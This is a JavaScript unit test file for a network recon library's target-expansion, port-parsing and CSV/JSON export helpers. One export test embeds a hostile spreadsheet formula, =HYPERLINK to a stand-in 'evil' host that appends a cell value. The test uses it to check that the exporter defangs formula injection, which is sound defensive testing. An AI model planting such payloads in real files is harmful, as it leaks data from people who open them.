// Unit tests for lib/recon/targets.js — CIDR/host-list expansion, port-spec
// parsing (no silent fallback), and CSV/JSON export. Fully offline.
import { test, group, assert } from "../harness.mjs";
import T from "../../lib/recon/targets.js";

group("recon: targets — expandTargets", () => {
  test("single host passes through", () => {
    const r = T.expandTargets("example.com");
    assert.equal(r.total, 1);
    assert.deepEqual(r.groups[0].hosts, ["example.com"]);
  });
  test("a /30 expands to 4 addresses", () => {
    const r = T.expandTargets("10.0.0.0/30");
    assert.equal(r.total, 4);
    assert.deepEqual(r.groups[0].hosts, ["10.0.0.0", "10.0.0.1", "10.0.0.2", "10.0.0.3"]);
  });
  test("/24 is a full 256-address block", () => {
    const r = T.expandTargets("192.168.1.0/24");
    assert.equal(r.total, 256);
    assert.equal(r.groups[0].hosts[255], "192.168.1.255");
  });
  test("CIDR host bits are normalized to the network base", () => {
    const r = T.expandTargets("10.0.0.5/30");
    assert.equal(r.groups[0].hosts[0], "10.0.0.4");
  });
  test("mixed comma/space list", () => {
    const r = T.expandTargets("a.com, 1.2.3.4  b.com");
    assert.equal(r.total, 3);
    assert.equal(r.errors.length, 0);
  });
  test("invalid tokens are reported, not silently dropped to defaults", () => {
    const r = T.expandTargets("good.com, not a host!!, 999.1.1.1");
    assert.ok(r.groups.some((g) => g.token === "good.com"));
    assert.ok(r.errors.length >= 1);
  });
  test("URL scheme and port are stripped", () => {
    const r = T.expandTargets("https://example.com:8443/path");
    assert.deepEqual(r.groups[0].hosts, ["example.com"]);
  });
  test("maxHosts caps expansion and flags truncation", () => {
    const r = T.expandTargets("10.0.0.0/16", { maxHosts: 100 });
    assert.equal(r.total, 100);
    assert.equal(r.truncated, true);
  });
  test("duplicate tokens de-duplicated", () => {
    const r = T.expandTargets("x.com x.com x.com");
    assert.equal(r.total, 1);
  });
  test("bad CIDR prefix reported as error", () => {
    const r = T.expandTargets("10.0.0.0/40");
    assert.equal(r.groups.length, 0);
    assert.ok(r.errors.length >= 1);
  });
});

group("recon: targets — parsePortSpec", () => {
  test("empty spec is an honest error, not a default list", () => {
    const r = T.parsePortSpec("");
    assert.equal(r.ports, null);
    assert.ok(r.error);
  });
  test("single port", () => {
    assert.deepEqual(T.parsePortSpec("443").ports, [443]);
  });
  test("range", () => {
    assert.deepEqual(T.parsePortSpec("80-82").ports, [80, 81, 82]);
  });
  test("comma list + ranges, sorted and de-duplicated", () => {
    assert.deepEqual(T.parsePortSpec("443,80,80,22-23").ports, [22, 23, 80, 443]);
  });
  test("out-of-range port rejected", () => {
    assert.equal(T.parsePortSpec("70000").ports, null);
    assert.ok(/1-65535/.test(T.parsePortSpec("70000").error));
  });
  test("inverted range rejected with a message", () => {
    const r = T.parsePortSpec("100-10");
    assert.equal(r.ports, null);
    assert.ok(/greater/.test(r.error));
  });
  test("garbage token rejected", () => {
    assert.equal(T.parsePortSpec("abc").ports, null);
  });
});

group("recon: targets — export", () => {
  const rows = [
    { host: "h1", port: 22, service: "ssh", banner: "OpenSSH 9.1" },
    { host: "h1", port: 80, service: "http", banner: 'nginx, "v1"' },
  ];
  test("CSV header + escaping of commas/quotes", () => {
    const csv = T.resultsToCsv(rows);
    const lines = csv.split("\n");
    assert.equal(lines[0], "host,port,service,banner");
    assert.ok(lines[2].includes('"nginx, ""v1"""'));
  });
  test("CSV neutralizes spreadsheet formula injection from a hostile banner", () => {
    const hostile = [{ host: "h1", port: 80, service: "http", banner: '=HYPERLINK("http://evil/"&A1,"x")' }];
    const csv = T.resultsToCsv(hostile);
    const cell = csv.split("\n")[1]; // the one data row
    assert.ok(!/(^|,)=/.test(cell), "a cell must not begin with = (formula)");
    assert.ok(cell.includes("'=HYPERLINK"), "the formula must be quote-prefixed");
    // +, -, @ leads are also neutralized
    assert.ok(T.resultsToCsv([{ host: "+1", port: 1, service: "@cmd", banner: "-2+3" }])
      .split("\n")[1].split(",").every((c) => !/^[=+\-@]/.test(c.replace(/^"/, ""))));
  });
  test("JSON export is valid and carries results + open count", () => {
    const obj = JSON.parse(T.resultsToJson(rows, { target: "h1" }));
    assert.equal(obj.open, 2);
    assert.equal(obj.target, "h1");
    assert.equal(obj.results.length, 2);
  });
});

group("recon: targets — ip helpers", () => {
  test("ipToInt/intToIp round-trip", () => {
    assert.equal(T.intToIp(T.ipToInt("192.168.0.1")), "192.168.0.1");
  });
  test("isIpv4 rejects out-of-range octets", () => {
    assert.equal(T.isIpv4("256.1.1.1"), false);
    assert.equal(T.isIpv4("10.0.0.1"), true);
  });
});
